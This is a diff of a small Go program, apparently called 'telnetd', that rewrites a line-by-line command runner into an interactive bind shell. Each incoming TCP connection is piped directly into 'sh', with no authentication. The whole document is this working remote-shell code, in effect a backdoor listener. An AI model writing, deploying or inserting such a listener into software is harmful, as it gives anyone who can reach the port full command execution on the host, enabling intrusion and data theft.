@@ -1,28 +1,23 @@
-package telnetd
+package main
 
 import (
-	"bufio"
 	"net"
 	"os"
 	"os/exec"
 )
 
 func main() {
-	var ln, _ = net.Listen("tcp", os.Args[1]+":"+os.Args[2])
+	var ln, _ = net.Listen("tcp", os.Args[1])
 	for {
 		var conn, _ = ln.Accept()
+		var cmd = exec.Command("sh")
+		cmd.Stdin = conn
+		cmd.Stdout = conn
+		cmd.Stderr = conn
+		cmd.Start()
 		go func() {
-			defer conn.Close()
-			var scanner = bufio.NewScanner(conn)
-			for scanner.Scan() {
-				var cmd = exec.Command("sh", "-c", scanner.Text())
-				cmd.Stdout = conn
-				cmd.Stderr = conn
-				cmd.Run()
-				if scanner.Text() == "exit" {
-					break
-				}
-			}
+			cmd.Wait()
+			conn.Close()
 		}()
 	}
 }
